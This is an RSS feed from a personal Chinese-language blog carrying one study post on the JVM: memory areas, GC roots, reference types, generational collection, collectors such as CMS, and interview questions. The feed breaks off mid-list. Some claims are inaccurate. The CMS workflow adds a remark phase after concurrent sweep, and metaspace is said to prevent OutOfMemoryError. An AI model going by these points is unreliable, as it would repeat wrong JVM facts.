<?xml version="1.0" encoding="utf-8"?>






<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>falcone&#39;s sweet home</title>
        <link>https://xuoneyuan.github.io/</link>
        <description>MemE 是一个强大且可高度定制的 GoHugo 博客主题，专为个人博客设计。</description>
        <generator>Hugo 0.120.3 https://gohugo.io/</generator>
        
            <language>zh-CN</language>
        
        
            <managingEditor>xuoneyuan@gmail.com (falcone)</managingEditor>
        
        
            <webMaster>xuoneyuan@gmail.com (falcone)</webMaster>
        
        
            <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
        
        <lastBuildDate>Tue, 14 May 2024 17:43:50 &#43;0800</lastBuildDate>
        
            <atom:link rel="self" type="application/rss&#43;xml" href="https://xuoneyuan.github.io/rss.xml" />
        
        
            <item>
                <title>JVM</title>
                <link>https://xuoneyuan.github.io/posts/22/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/22/</guid>
                <pubDate>Fri, 10 May 2024 14:45:57 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h2 id=&#34;jvm基础&#34;&gt;JVM基础&lt;/h2&gt;
&lt;h3 id=&#34;什么是jvm&#34;&gt;什么是JVM?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义&lt;/p&gt;
&lt;p&gt;Java Virtual Machine Java程序的运行环境（Java二进制字节码的运行环境）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;好处&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一次编译，到处运行&lt;/li&gt;
&lt;li&gt;自动内存管理，垃圾回收功能&lt;/li&gt;
&lt;li&gt;数组下表越界检查&lt;/li&gt;
&lt;li&gt;多态&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;比较JVM、JRE、JDK&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JVM（Java Virtual Machine），Java虚拟机&lt;/li&gt;
&lt;li&gt;JRE（Java Runtime Environment），Java运行环境，包含了JVM和Java的核心类库（Java API）&lt;/li&gt;
&lt;li&gt;JDK（Java Development Kit）称为Java开发工具，包含了JRE和开发工具&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;jvm-在-java-中是如何工作的&#34;&gt;JVM 在 Java 中是如何工作的&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm2.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JVM主要分为三个子系统
&lt;ul&gt;
&lt;li&gt;类加载器（ClassLoader）&lt;/li&gt;
&lt;li&gt;JVM运行时数据区（内存结构）&lt;/li&gt;
&lt;li&gt;执行引擎&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jvm内存结构&#34;&gt;JVM内存结构&lt;/h2&gt;
&lt;h3 id=&#34;程序计数器&#34;&gt;程序计数器&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;定义&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JVM中的程序计数器(Program Counter Register)是一块较小的内存空间，它用来保存当前线程下一条要执行的指令的地址。每个线程都有自己独立的程序计数器，它是线程私有的，生命周期与线程相同。程序计数器是JVM中的一种轻量级的内存区域，因为它不会发生内存溢出（OutOfMemoryError）的情况。&lt;/p&gt;
&lt;p&gt;程序计数器的作用在于线程切换后能够恢复到正确的执行位置，也就是下一条需要执行的指令地址。&lt;/p&gt;
&lt;p&gt;因为在Java虚拟机的多线程环境下，为了支持线程切换后能够恢复到正确的执行位置，每个线程都需要有一个独立的程序计数器，否则就会出现线程切换后执行位置混乱的问题。&lt;/p&gt;
&lt;p&gt;程序计数器也是唯一一个在Java虚拟机规范中没有规定任何OutOfMemoryError（内存溢出）情况的区域。因为程序计数器是线程私有的，所以它所占用的内存空间非常小，一般不会导致内存溢出的问题。&lt;/p&gt;
&lt;p&gt;程序计数器是JVM中的一种非常重要的内存区域，它是实现Java虚拟机字节码解释器的必要组成部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小结
&lt;ul&gt;
&lt;li&gt;程序计数器
&lt;ul&gt;
&lt;li&gt;作用：保存当前线程下一条要执行的指令的地址&lt;/li&gt;
&lt;li&gt;特点：&lt;br&gt;
线程私有&lt;br&gt;
不存在内存溢出&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;虚拟机栈&#34;&gt;虚拟机栈&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;定义&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Java虚拟机栈（Java Virtual Machine Stacks）是Java虚拟机为每个线程分配的一块内存区域，用于存储线程的方法调用和局部变量等信息。
每个线程在运行时都有自己的Java虚拟机栈，线程开始时会创建一个新的栈帧（Stack Frame），用于存储该线程的方法调用信息。当方法调用完成后，该栈帧会被弹出，回到上一次方法调用的位置。每个线程只能有一个活动栈帧，对应着当前正在执行的那个方法。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小结
&lt;ul&gt;
&lt;li&gt;Java虚拟机栈&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;每个线程运行是所需的内存，就称为虚拟机栈&lt;/li&gt;
&lt;li&gt;每个栈由多个栈帧（Frame）组成，对应着每次方法调用时占用的内存&lt;/li&gt;
&lt;li&gt;每个线程只能有一个活动栈帧，对应着当前正在执行的那个方法&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;本地方法栈&#34;&gt;本地方法栈&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;本地方法栈，我们先来理解一下什么叫本地方法
&lt;ul&gt;
&lt;li&gt;本地方法是指由非Java语言编写的代码，如C或C++，并被编译为本地二进制代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因为JAVA没法直接和操作系统底层交互，所以需要用到本地方法栈来调用本地的C或C++的方法&lt;/li&gt;
&lt;li&gt;例如Object类的源码中就有本地方法，用native关键字修饰本地方法
&lt;ul&gt;
&lt;li&gt;本地方法只有函数声明，没有函数体，因为函数体是C或C++写的，通常是通过JNI（Java Native Interface）技术来实现的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;堆&#34;&gt;堆&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;定义&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;JVM的堆（Heap）是Java虚拟机（JVM）在内存中用来存放对象的区域，是Java程序中最大的一块内存区域。JVM的堆被所有线程共享，在JVM启动时就已经被创建，并且一直存在于JVM的整个生命周期中。&lt;/p&gt;
&lt;p&gt;堆可以被分成两部分：新生代（Young Generation）和老年代（Old Generation）。新生代又被进一步分为Eden空间、幸存区From空间和幸存区To空间。
新生代是用来存放新创建的对象的，其中大部分对象都很快就会被垃圾回收掉。当堆空间不足时，JVM会触发垃圾回收机制（GC），对新生代的对象进行清理。清理过程一般是将存活的对象移到老年代或幸存区，而其余的对象则被回收。&lt;/p&gt;
&lt;p&gt;老年代是用来存放生命周期较长的对象的，这些对象一般是从新生代晋升而来，或者是本身就比较大的对象。老年代的对象存活时间较长，因此垃圾回收的频率比新生代低得多。&lt;/p&gt;
&lt;p&gt;JVM堆的大小可以通过启动JVM时的参数进行调整，如-Xms和-Xmx参数分别控制堆的初始大小和最大大小。如果应用程序需要创建大量的对象，而堆空间不足，则会抛出OutOfMemoryError异常。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;小结
&lt;ul&gt;
&lt;li&gt;Heap堆
&lt;ul&gt;
&lt;li&gt;通过new关键字创建的对象都会使用堆空间&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特点
&lt;ul&gt;
&lt;li&gt;它是线程共享的，堆空间内的对象都需要考虑线程安全的问题&lt;/li&gt;
&lt;li&gt;有垃圾回收机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;方法区&#34;&gt;方法区&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;定义
在JVM中，方法区是一块用于存储类信息、常量、静态变量、即时编译器编译后的代码等数据的内存区域，它是Java虚拟机规范中的一个概念。Java SE 7及之前版本中，方法区被称为永久代，但在Java SE 8之后的版本中，永久代被废弃了，被元空间所替代。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;元空间是JVM在Java SE 8之后引入的一个新的概念，它与永久代类似，都是用于存储类信息、常量、静态变量、即时编译器编译后的代码等数据的内存区域，但元空间的实现方式与永久代有所不同。&lt;/p&gt;
&lt;p&gt;与永久代不同的是，元空间使用的是本地内存（Native Memory），而不是虚拟机内存（堆内存），这样就避免了OutOfMemoryError错误，因为在使用本地内存时，可以动态地调整大小，而且可以使用操作系统的虚拟内存机制，使得Java应用程序不会被限制在固定的内存大小中。&lt;/p&gt;
&lt;p&gt;此外，元空间还引入了一些新的概念和机制，例如MetaspaceSize、MaxMetaspaceSize、CompressedClassSpaceSize等，这些概念和机制都是为了更好地管理元空间的内存使用和性能。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;组成
&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm3.png&#34; alt=&#34;1&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jvm垃圾回收&#34;&gt;JVM垃圾回收&lt;/h2&gt;
&lt;h3 id=&#34;如何判断对象可以回收&#34;&gt;如何判断对象可以回收&lt;/h3&gt;
&lt;h4 id=&#34;引用计数法&#34;&gt;引用计数法&lt;/h4&gt;
&lt;p&gt;当一个对象被引用时，就当引用对象的值+1，当引用对象的值为0时，则说明该对象没有被引用，那么就可以被垃圾回收器回收&lt;/p&gt;
&lt;p&gt;这个引用计数法听起来很不错，而且实现起来也非常的简单，可是它有一个弊端，如下图所示，当两个对象循环引用时，两个对象的计数都未1，就导致这两个对象都无法被释放
&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm4.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;可达性分析算法&#34;&gt;可达性分析算法&lt;/h4&gt;
&lt;p&gt;JVM垃圾回收机制的可达性分析算法，是一种基于引用的垃圾回收算法。其基本思想是通过一系列被称为&amp;quot;GC Roots&amp;quot;的根对象作为起点，寻找所有被根对象直接或间接引用的对象，将这些对象称为&amp;quot;可达对象&amp;quot;，而没有被找到的对象则被视为&amp;quot;不可达对象&amp;quot;，需要被回收。



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;形象一点理解就是我有一串葡萄，我把这串葡萄拿起来，连在根上的葡萄就是可达对象，而掉在盘子里的葡萄就是不可达对象，需要被回收&lt;/p&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在JVM中，有四种类型的GC Roots对象：
&lt;ol&gt;
&lt;li&gt;虚拟机栈中引用的对象：虚拟机栈是用于存储方法调用和执行的栈空间。当一个方法被调用时，会在栈中创建一个栈帧，用于存储该方法的局部变量、参数和返回值等信息。如果栈帧中包含对某个对象的引用，那么这个对象就被视为GC Roots对象。&lt;/li&gt;
&lt;li&gt;方法区中类静态属性引用的对象：方法区是用于存储类信息、常量池、静态变量等信息的内存区域。当一个类被加载到方法区时，其中的静态属性会被分配在方法区中，如果这些静态属性中包含对某个对象的引用，那么这个对象就被视为GC Roots对象。&lt;/li&gt;
&lt;li&gt;方法区中常量引用的对象：常量池是方法区的一部分，用于存储常量。如果常量池中包含对某个对象的引用，那么这个对象就被视为GC Roots对象。&lt;/li&gt;
&lt;li&gt;本地方法栈中JNI引用的对象：JNI是Java Native Interface的缩写，用于在Java程序中调用本地方法（即由C或C++等语言编写的方法）。当本地方法被调用时，会在本地方法栈中创建一个栈帧，如果该栈帧中包含对某个对象的引用，那么这个对象就被视为GC Roots对象。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;可达性分析算法基于这些GC Roots对象，通过遍历所有的引用链，找到所有可达对象，将它们标记为存活对象，而没有被找到的对象则被视为不可达对象，需要被回收。&lt;/li&gt;
&lt;li&gt;可达性分析算法的主要优点是可以处理复杂的引用结构，例如循环引用、交叉引用等情况，能够识别出所有可达对象，从而准确地进行垃圾回收。但是，它也有一些缺点，例如需要耗费较多的时间进行垃圾回收、可能会出现漏标和误标等问题。为了解决这些问题，JVM中还采用了其他的垃圾回收算法，如标记-清除算法、复制算法、标记-整理算法等，以提高垃圾回收的效率和准确性。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;引用类型&#34;&gt;引用类型&lt;/h4&gt;
&lt;p&gt;在Java中，对象不仅可以被正常引用，还可以被特殊的引用类型引用。这些引用类型决定了垃圾回收器如何对对象进行回收。&lt;/p&gt;
&lt;p&gt;JVM中共有五种引用类型，它们分别是&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;强引用（Strong Reference）：是最常见的引用类型，也是默认的引用类型。如果一个对象具有强引用，那么即使内存空间不足，垃圾回收器也不会回收它。只有当该对象的所有强引用都失效时，对象才会被回收&lt;/li&gt;
&lt;li&gt;软引用（Soft Reference）：是一种比强引用弱一些的引用类型。如果一个对象只具有软引用，那么当内存空间不足时，垃圾回收器可能会回收它。软引用通常用于实现内存敏感的缓存
可以配合引用队列来释放软引用自身&lt;/li&gt;
&lt;li&gt;弱引用（Weak Reference）：是一种比软引用更弱一些的引用类型。如果一个对象只具有弱银用，那么垃圾回收器在下一次运行时，无论内存空间是否足够，都会回收该对象。若引用通常用于实现在对象可用时进行操作的场景
可以配合引用队列来释放软引用自身&lt;/li&gt;
&lt;li&gt;虚引用（Phantom Reference）：是最弱的一种引用类型。如果一个对象只具有虚引用，那么在任何时候都可能被垃圾回收器回收。虚引用通常用于追踪对象被垃圾回收的状态
必须配合引用队列使用，主要配合 ByteBuffer 使用，被引用对象回收时，会将虚引用入队，由 Reference Handler 线程调用虚引用相关方法释放直接内存&lt;/li&gt;
&lt;li&gt;终结器引用（Final Reference）：是一种特殊的弱引用类型，它只在对象被回收时被添加到引用队列中。当垃圾回收器准备回收一个对象时，会先执行对象的finallize()方法，如果finalize()方法中没有重新让对象与其他对象建立联系，那么这个对象就会被回收，并且它的Final引用会被加入到引用队列中。Final引用通常用于对象回收后的清理工作&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;分代垃圾回收&#34;&gt;分代垃圾回收&lt;/h3&gt;
&lt;p&gt;JVM（Java虚拟机）的分代垃圾回收是一种优化内存回收的技术。它利用对象的生命周期来将堆（heap）分为不同的区域，然后针对不同区域的特点采用不同的垃圾回收算法。
&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm5.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对象首先分配在伊甸园区域&lt;/li&gt;
&lt;li&gt;新生代空间不足时，触发minor gc，伊甸园和from存活的对象使用copy复制到to中，存活的对象年龄+1并且交换from和to&lt;/li&gt;
&lt;li&gt;minor gc会引发stop the world（砸瓦鲁多！！），暂停其它用户的线程，等垃圾回收结束，用户线程才恢复运行&lt;/li&gt;
&lt;li&gt;当对象寿命超过阈值时，会晋升至老年代，最大寿命是15
&lt;ul&gt;
&lt;li&gt;Java中的对象头中确实分配了一定的字节用来记录对象的年龄，而这个字节的位数是4，因此其二进制最大值为1111，即十进制的15&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;当老年代空间不足，会先尝试触发minor gc，如果之后空间仍不足，那么触发full gc，STW的时间更长&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;垃圾回收器&#34;&gt;垃圾回收器&lt;/h3&gt;
&lt;h4 id=&#34;串行收集器serial收集器&#34;&gt;串行收集器(Serial收集器）&lt;/h4&gt;
&lt;p&gt;这是最简单的垃圾回收器，它通过一个单线程进行垃圾回收，因此它的优点是简单高效，但缺点是在大型应用程序中可能会出现停顿时间过长的问题。&lt;/p&gt;
&lt;p&gt;串行收集器的缺点主要是单线程执行垃圾回收操作，不能充分利用多核CPU的计算能力，同时垃圾回收操作会阻塞应用程序的运行，可能会导致长时间的停顿。因此，在大型的、多线程的应用程序中，通常不适合使用串行收集器进行垃圾回收。&lt;/p&gt;
&lt;p&gt;对应的VM参数：-XX:+UseSerialGC = Serial + SerialOld&lt;/p&gt;
&lt;p&gt;下图中，其他CPU需要等待CPU 2执行完垃圾回收后，才能继续运行
&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;吞吐量优先收集器parallel收集器&#34;&gt;吞吐量优先收集器(Parallel收集器)&lt;/h4&gt;
&lt;p&gt;JDK 1.8 默认采用的就是这种垃圾回收器&lt;/p&gt;
&lt;p&gt;它是一种基于多线程并行执行的垃圾回收器，它的主要目标是提高应用程序的吞吐量，即在单位时间内处理更多的请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm7.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;cms收集器响应时间优先&#34;&gt;CMS收集器(响应时间优先)&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;概述&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CMS（Concurrent Mark Sweep）是一种垃圾回收算法，它的设计目标是在最短的停顿时间内回收垃圾。它通过在一个线程中进行垃圾回收并在应用程序线程中同时运行，从而减少停顿时间。下面详细介绍CMS垃圾收集器的工作原理和优缺点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;工作流程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CMS垃圾收集器的工作可以分为以下几个阶段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初始标记阶段（Initial Marking）：在这个阶段中，CMS垃圾收集器会暂停所有应用程序线程，并且在内存中标记出所有被直接引用的对象。这个过程由一个线程来完成，因此它的停顿时间比较短。&lt;/li&gt;
&lt;li&gt;并发标记阶段（Concurrent Marking）：在这个阶段中，CMS垃圾收集器会在应用程序线程运行的同时标记出所有被间接引用的对象。这个过程由多个线程并发执行，因此它的停顿时间比较短。&lt;/li&gt;
&lt;li&gt;重新标记阶段（Remark）：在这个阶段中，CMS垃圾收集器会暂停所有应用程序线程，并且重新标记出在并发标记阶段中有变化的对象。这个过程由一个线程来完成，因此它的停顿时间比较短。&lt;/li&gt;
&lt;li&gt;并发清除阶段（Concurrent Sweeping）：在这个阶段中，CMS垃圾收集器会在应用程序线程运行的同时清除所有标记为垃圾的对象。这个过程由多个线程并发执行，因此它的停顿时间比较短。&lt;/li&gt;
&lt;li&gt;最终标记阶段（Final Remark）：在这个阶段中，CMS垃圾收集器会暂停所有应用程序线程，并且重新标记出在并发清除阶段中有变化的对象。这个过程由一个线程来完成，因此它的停顿时间比较短。
&lt;img src=&#34;https://xuoneyuan.github.io/images/jvm8.png&#34; alt=&#34;1&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;优缺点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优点&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;可以在最短的停顿时间内回收垃圾，不会出现长时间的停顿现象，因此适合响应时间比较敏感的应用程序。&lt;/li&gt;
&lt;li&gt;采用并发的垃圾收集方式，能够与应用程序并发执行，不会阻塞应用程序的执行，因此对于需要保证应用程序响应性能的场景非常适用。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;缺点&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;对 CPU 的使用比较敏感，在高负载情况下可能会影响应用程序的性能。&lt;/li&gt;
&lt;li&gt;由于并发清除阶段无法整理内存，可能会出现内存碎片化的问题，导致后续垃圾回收过程需要更多的时间。&lt;/li&gt;
&lt;li&gt;在处理大量的垃圾时可能会导致应用程序的性能下降，因为需要占用一定的 CPU 资源。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jvm内存模型&#34;&gt;JVM内存模型&lt;/h2&gt;
&lt;p&gt;很多人将Java内存结构和Java内存模型傻傻分不清，Java内存模型是Java Memory Model(JMM)的意思&lt;/p&gt;
&lt;p&gt;简单地说，JMM定义了一套在多线程读写共享数据时（成员变量、数组），对数据的可见性、有序性和原子性的规则和保障&lt;/p&gt;
&lt;h2 id=&#34;jvm面试题&#34;&gt;JVM面试题&lt;/h2&gt;
&lt;details&gt;
&lt;summary&gt;简述一下JVM内存模型&lt;/summary&gt;
&lt;p&gt;JVM内存模型（JVM Memory Model，JMM）是Java虚拟机用来描述多线程程序中各个线程之间以及线程和内存之间的交互关系的规范。JMM定义了线程的工作内存和主内存之间的交互方式，并规定了在何时如何把工作内存中的数据同步回主内存，或者如何从主内存中读取数据到工作内存中。JMM的设计目的是为了保证在多线程程序中，无论运行在什么平台和处理器架构上，Java程序都能达到一致的内存访问效果。Java开发人员在编写多线程时必须遵守JMM规范来保证程序的正确性&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;说说堆和栈的区别&lt;/summary&gt;
&lt;ol&gt;
&lt;li&gt;内存管理方式：栈采用静态内存分配，而堆采用动态内存分配。栈的大小在编译时就已经确定，而堆的大小可以在运行时动态调整&lt;/li&gt;
&lt;li&gt;存储内容：栈主要用于存储基本数据类型（int、float、boolean等）以及对象的引用，而堆主要负责存储对象实例&lt;/li&gt;
&lt;li&gt;内存分配方式：栈的内存分配方式是后进先出，而堆是随意分配、随意释放&lt;/li&gt;
&lt;li&gt;存储效率：由于栈采用静态内存分配，因此它的存取速度比堆更快，而堆则因为需要进行动态内存分配和垃圾回收等操作，因此存取速度相对较慢&lt;/li&gt;
&lt;li&gt;内存回收机制：栈的内存由JVM自动管理，当方法结束时，栈中的内存会自动被释放；而堆内存则由JVM的垃圾回收机制进行管理，当对象没有被引用时，垃圾回收机制会自动回收该对象占用的内存空间&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Java内存结构&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;程序计数器(Program Counter Register)：每个线程都有一个程序计数器，它是线程私有的，用于记录当前线程正在执行的字节码指令的地址或者下一条指令的地址。如果执行的是native方法，则计数器为空。&lt;/li&gt;
&lt;li&gt;Java虚拟机栈(Java Virtual Machine Stack)：Java虚拟机栈也是线程私有的，用于存储每个县城的方法调用栈。每当一个方法被调用时，JVM都会为该方法分配一个栈帧，该栈帧包含了该方法的参数、局部变量以及操作数栈等信息。方法在返回时，JVM会弹出该栈帧。栈的大小可以是固定的，也可以是动态扩展的。栈的大小决定了方法调用的可达深度（递归调用次数，或者嵌套调用层数等，可以使用-Xss参数设置虚拟机栈的大小）。如果请求的栈深度大于最大可用深度，则会抛出StackOverFlowError。如果栈是可动态扩展的，但没有内存空间支持扩展，则抛出OutOfMemoryError&lt;/li&gt;
&lt;li&gt;本地方法栈(Native Method Stack)：本地方法栈也是线程私有的，与虚拟机栈类似，不同之处在于它为JVM执行本地方法(Native Method)服务&lt;/li&gt;
&lt;li&gt;方法区(Method Area)：方法区用于存储已被加载的类的信息、常量池、静态变量、即时编译器编译后的代码等信息。方法区也是由垃圾回收器进行管理和回收的&lt;/li&gt;
&lt;li&gt;堆(Java Heap)：堆是JVM中最大的内存区域，用于存储对象实例以及数组等数据。Java堆的内存空间是由垃圾回收器进行管理和回收的&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;说说对象分配规则&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;对象优先分配在Eden区，如果Eden区没有足够的空间，虚拟机执行一次Minor GC&lt;/li&gt;
&lt;li&gt;大对象直接进入老年代（大对象是指需要大量连续内存空间的对象）。这样做的目的是避免在Eden区和两个Survivor区（from和to）之间发生大量的内存拷贝（新生代采用复制算法收集内存，避免产生大量内存碎片）&lt;/li&gt;
&lt;li&gt;长期存活的对象进入老年代。虚拟机为每个对象定义了一个年龄计数器，如果对象经过了一次Minor GC，那么对象就会进入Survivor区，之后每经过一次Minor GC，对象年龄加一，直到达到阈值，对象进入老年区&lt;/li&gt;
&lt;li&gt;动态判断对象的年龄，如果Survivor区中相同年龄的虽有对象大小总和大于Survivor空间的一半，那么年龄大于等于该年龄的对象可以直接进入老年代。&lt;/li&gt;
&lt;li&gt;空间分配担保。每次进行Minor GC时，JVM会计算Survivor区移至老年区的对象的平均大小
&lt;ul&gt;
&lt;li&gt;如果这个值大于老年区的剩余值，则进行一次FULL GC，&lt;/li&gt;
&lt;li&gt;如果小于，则检查HandlePromotionFailure设置，如果为true，则只进行Monitor GC，如果为false，则进行FULL GC&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;说说Java对象创建过程&lt;/summary&gt;
&lt;p&gt;Java对象的创建过程可以概括为以下几个步骤&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;类加载：JVM会先检查类是否已经被加载了，如果没有则通过类加载器加载类的class文件，并将类的信息存储到方法区中&lt;/li&gt;
&lt;li&gt;内存分配：当类被加载后，JVM会为该类的对象分配内存，根据Java对象的特点，内存大小是在编译时就已经确定的，因此内存分配可以通过一些简单的算法来实现，例如指针碰撞和空闲列表等&lt;/li&gt;
&lt;li&gt;初始化：内存分配完成后，JVM会对对象进行默认初始化，即将对象的成员变量赋上默认值。基本类型的默认值是0或false，引用类型的默认值是null&lt;/li&gt;
&lt;li&gt;构造函数：默认初始化后，JVM会调用该对象的构造函数，进行对象的属性初始化和一些其他操作&lt;/li&gt;
&lt;li&gt;返回地址：构造函数执行完毕后，JVM会将对象的引用返回给调用者，此时对象创建过程完毕&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;你知道哪些垃圾回收算法&lt;/summary&gt;
&lt;p&gt;GC最基础的算法有三种：标记-清除算法、复制算法、标记-压缩算法，我们常用的垃圾回收器一般都采用分代收集算法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;标记-清除算法：首先标记出所有仍然使用的对象，在标记完成后清理掉未被标记的垃圾对象。它的主要缺点是会产生内存碎片。&lt;/li&gt;
&lt;li&gt;复制算法：将堆内存分为两个区域，每次只使用其中一块。当着一块用完之后，将所有存活的对象复制到另一块未使用的区域，同时将这一块整个清空。这种算法的缺点是需要耗费两倍的内存空间，适用于对象存活率比较低的情况&lt;/li&gt;
&lt;li&gt;标记-压缩算法：标记过程与标记清除算法一样，但后续的步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向同一端移动，然后清理掉端边界以外的内存。它的主要缺陷是需要大量的对象移动操作，影响性能&lt;/li&gt;
&lt;li&gt;分代收集算法：根据对象的特征和存活周期，将堆内存划分为不同的区域，一般分为新生代和老年代。不同的区域使用不同的垃圾收集算法和参数设置。例如年轻代通常采用复制算法，老年代采用标记整理算法或分块整理等&lt;/li&gt;
&lt;li&gt;G1收集器：它是一个面向服务端应用的垃圾收集器，采用分代收集算法，将堆内存划分为多个region，并动态做垃圾回收。G1适用于大型、多核、高并发应用下的垃圾回收&lt;/li&gt;
&lt;/ol&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;说一下JVM有哪些垃圾回收器&lt;/summary&gt;
&lt;ul&gt;
&lt;li&gt;Serial收集器（复制算法）：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;新生代单线程收集器，标记和清理都是单线程，优点是简单高效；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ParNew收集器 (复制算法)：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;新生代收并行集器，实际上是Serial收集器的多线程版本，在多核CPU环境下有着比Serial更好的表现；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Parallel Scavenge收集器 (复制算法)：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;新生代并行收集器，追求高吞吐量，高效利用 CPU。吞吐量 = 用户线程时间/(用户线程时间+GC线程时间)，高吞吐量可以高效率的利用CPU时间，尽快完成程序的运算任务，适合后台应用等对交互相应要求不高的场景；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Serial Old收集器 (标记-整理算法)：&lt;/li&gt;
&lt;/ul&gt;
